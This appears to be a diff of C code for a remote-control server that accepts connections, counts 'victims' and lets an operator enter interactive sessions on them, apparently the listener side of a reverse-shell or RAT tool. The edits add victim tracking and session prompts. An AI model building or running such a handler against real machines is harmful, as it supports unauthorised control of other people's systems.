@@ -36,15 +36,15 @@ int server_control_session(){
                     selected_id += ((int) buffer[c] - 48) * (strlen(buffer) - 5);  // TODO FIX THIS MESS PLEASE
                 }
             }
-            printf("Exiting server control session...\n");
-            printf("Entering control session with id '%d'...\n", selected_id);
-            if (selected_id >= MAX_CLIENTS || selected_id < 0) {
-                printf("Invalid id!\n\n");
-                continue;
-            }
-            selected_id += 3;
 
-            return selected_id;
+            if (selected_id > victim_count || selected_id < 0) {
+                printf("Invalid id!\n\n");
+            } else {
+                printf("Entering victim control session with VID: %d...\n", selected_id);
+                printf("Type \"!exit\" to background victim control session\n");
+                selected_id += 3;
+                return selected_id;
+            }
         } else if (strcmp(buffer, "exit\n") == 0 || strcmp(buffer, "exit\n\n") == 0){
             printf("Exiting server control session...\n");
             return -1;
@@ -68,7 +68,7 @@ void *Socket_Reader(){
 
     n = read(a.dest, buffer, MAXBUF);
     write(STDOUT_FILENO, buffer, n);
-    //printf("%d>", a.dest);
+
     fflush(NULL);
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
 
@@ -98,8 +98,8 @@ void *Socket_Writer()
 
     while (a.kill == 0 && (n = read(a.src, buffer, MAXBUF - 1)) > 0) // reads from the stdin file descriptor and executes code if it's contents are above 0. a.src is passed the stdin fd on line 122
     {
-        printf("|||||\n%s\n|||||\n", buffer);
-        if (strcmp(buffer, "!exit\n") == 0 || strcmp(buffer, "!exit\n\n") == 0) {
+
+        if (strcmp(buffer, "!exit\n") == 0 || strcmp(buffer, "!exit\n\n") == 0) { //Find a way
             printf("Exiting session...\n");
             a.kill = 1;
             return NULL;
@@ -168,7 +168,10 @@ void *Acceptor(){
                     // only if position is empty
                     if( client_socket[i] == 0 ){
                         client_socket[i] = new_socket;
-                        printf("\nConnection received with %s\n\n", get_socket_addr(new_socket));
+                        victim_count++;
+                        printf("\nConnection received with %s\n", get_socket_addr(new_socket));
+                        printf("Press enter to or type a command to resume previous session\n\n");
+
 
                         break;
                     }
